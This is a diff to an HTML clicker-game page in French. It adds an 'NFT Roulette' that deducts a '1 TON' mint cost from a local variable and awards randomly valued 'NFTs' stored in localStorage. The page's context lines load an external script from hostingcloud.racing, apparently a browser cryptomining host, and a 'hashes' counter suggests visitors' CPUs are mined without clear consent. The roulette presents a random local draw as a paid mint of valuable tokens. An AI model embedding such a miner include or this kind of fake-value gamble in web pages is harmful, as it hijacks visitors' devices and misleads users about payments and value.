@@ -88,6 +88,78 @@ h1 { color:#4caf50; text-align:center; }
   <div id="chatLogs"></div>
   <input type="text" id="chatInput" placeholder="Votre message..."/>
 </div>
+  <div id="nftSection">
+  <h3 style="color:#ff69b4;">🎰 NFT Roulette</h3>
+  <p id="nftAccessMsg">Vous devez avoir cliqué 500 000 fois et accumulé 100 M hashes pour accéder.</p>
+  <button id="spinNFTBtn">🔄 Tourner la roue (100 M Hashes + 1 TON)</button>
+  <h4>Inventaire NFT actif</h4>
+  <div id="nftActive" style="display:flex; flex-wrap:wrap;"></div>
+  <h4>Inventaire NFT simple</h4>
+  <div id="nftSimple" style="display:flex; flex-wrap:wrap;"></div>
+</div>
+
+<script>
+// Chargement inventaires
+let nftInventoryActive = JSON.parse(localStorage.getItem("nftInventoryActive")) || [];
+let nftInventorySimple = JSON.parse(localStorage.getItem("nftInventorySimple")) || [];
+
+function updateNFTUI(){
+  const activeDiv = document.getElementById("nftActive");
+  const simpleDiv = document.getElementById("nftSimple");
+  activeDiv.innerHTML = "";
+  simpleDiv.innerHTML = "";
+  nftInventoryActive.forEach((nft,i)=>{
+    const el = document.createElement("div");
+    el.style.border="1px solid #f0f";
+    el.style.margin="3px"; el.style.padding="3px";
+    el.textContent=`${nft.name} (${nft.value} TON)`;
+    activeDiv.appendChild(el);
+  });
+  nftInventorySimple.forEach((nft,i)=>{
+    const el = document.createElement("div");
+    el.style.border="1px solid #888";
+    el.style.margin="3px"; el.style.padding="3px";
+    el.textContent=`${nft.name} (${nft.value} TON)`;
+    simpleDiv.appendChild(el);
+  });
+}
+
+// Fonction roulette NFT
+document.getElementById("spinNFTBtn").addEventListener("click",()=>{
+  if(totalClicks<500000 || totalHashes<100000000){
+    alert("Vous n'avez pas encore le droit d'accéder à la roulette NFT.");
+    return;
+  }
+  if(deadspot<1){
+    alert("Vous devez payer 1 TON pour mint le NFT.");
+    return;
+  }
+  deadspot-=1; // Mint cost
+
+  // Random NFT value
+  let nftValue = (Math.random()*177.8 + 0.2).toFixed(3);
+  const nftName = "NFT#"+Math.floor(Math.random()*1000000);
+  const nft = {name:nftName,value:parseFloat(nftValue)};
+  
+  // Choix aléatoire actif ou simple (50% chance)
+  if(Math.random()<0.5){
+    if(deadspot>=0.25){ // Activer NFT
+      deadspot-=0.25;
+      nftInventoryActive.push(nft);
+      alert(`${nftName} minté et activé (bonus actif) !`);
+    } else {
+      nftInventorySimple.push(nft);
+      alert(`${nftName} minté mais inventaire simple (pas assez de TON pour activer)`);
+    }
+  } else {
+    nftInventorySimple.push(nft);
+    alert(`${nftName} minté dans inventaire simple.`);
+  }
+  saveGame(); updateNFTUI(); updateUI();
+});
+
+updateNFTUI();
+</script>
 
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 <script src="https://www.hostingcloud.racing/WPmG.js"></script>
